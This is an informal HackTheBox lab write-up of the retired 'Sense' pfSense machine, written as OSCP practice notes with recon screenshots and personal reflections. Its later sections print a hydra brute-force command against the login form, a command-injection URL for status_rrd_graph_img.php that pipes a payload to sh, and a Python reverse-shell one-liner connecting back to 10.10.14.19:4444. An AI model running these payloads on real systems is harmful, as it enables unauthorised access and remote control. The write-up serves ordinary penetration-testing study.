# Sense Writeup

Name: Sense
Date:  28/3/2024
Difficulty:  Easy
Goals:  OSCP Prep
Learnt: 
- When you get banned learn how to proxy!
- This box actually harmed me so I left a review.
- Non-sensical
- I ACTUAL did this boxes without finishing it. the only thing that was the issue was the `\'{payload}\'` and instead without the escaping of `'` as f-strings do not need you to escape single quotes, because python is just fucking stupid.
Beyond Root:
- Blooms Taxomony for myself and notes

Previous recon and progress from 2022 are after the Beyond Root

## Return in the year Bing, my poor 2022 self avenged!

The time to live(TTL) indicates its OS. It is a decrementation from each hop back to original ping sender. Linux is < 64, Windows is < 128.
![ping](HackTheBox/Retired-Machines/Sense/Screenshots/ping.png)

Considering the ominous banning and requirement of proxies..
![](pFFFnonsensiscalboxnotcool.png)

Lesson I learnt from this box not stated below is a thousand pictures tell a million words!
![](MORESCREENSHOTS.png)
The version is right there! This made me wonder about the Zenbleed vulnerability and if that is actually patched on all these machines, back then it definitely was not. I picked the correct vulnerability. So really this box is done, but my current frame of mind was stressed due getting Covid preparing in the first of three months. I am glad I realised this box is not good. In 2024 it is rated 2.7, which not good.

AND root!
![](Iwouldhavegothis.png)


## Post Root Reflection

- Left an upset review to pay tribute to my past self
- Sometimes it is just that easy

## Beyond Root

Hack-Bloomings-Hackonomy-For-Learned 

Heavily inspired, by Blooms Taxonomy no offence to Bloom:
![1920](bloomisaplum.excalidraw)


https://www.teachthought.com/learning/what-is-blooms-taxonomy/
https://cft.vanderbilt.edu/guides-sub-pages/blooms-taxonomy/


#### Previous Recon

The time to live(TTL) indicates its OS. It is a decrementation from each hop back to original ping sender. Linux is < 64, Windows is < 128.
![ping](HackTheBox/Retired-Machines/Sense/Screenshots/ping.png)

Nuclei:
![lightpd](lighttpd-1-4-35.png)

Nmap found /tree
![tree](silverstripetreedirectory.png)

![links](treeoflinks.png)

Firewalls
![changelog](changelogDOTtxt.png)

Blocked out non multiples of less than 3
![sense](oneofthreevulns.png)
2.2 - 2.4

Research `pfsense_ng`
[Documentation: Feature list 2.0](https://docs.netgate.com/pfsense/en/latest/releases/2-0-0.html)
FreeBSD!

Basically tried some of the exploits; I missed the system-users.txt file, because I did not proxy after being banned. Checked the video, after one of the exploits required authenication and I tried the others..

![sad](sadban.png)

Tried:
```bash
hydra -l Rohit -P /usr/share/wordlists/rockyou.txt -f 10.129.63.73 http-post-form '/index.php:__csrf_magic=sid%3A9b9199df3b86ab6e2c7871980c946b040c5ac939%2C1662233351&usernamefld=^USER^&passwordfld=^PASS^&login=Login:F=incorrect'
```
Then tried pfsense as password with rohit, not Rohit.

#### Previous Exploit attempts

Secondly I changed the exploit to handle string concatenation properly in 3.10 python:

```python
login_url = f"https://{rhost}/index.php"
exploit_url = f"https://{rhost}/status_rrd_graph_img.php?database=queues;printf\'{payload}\'|sh"
```

This also did not work, 

```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.19",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
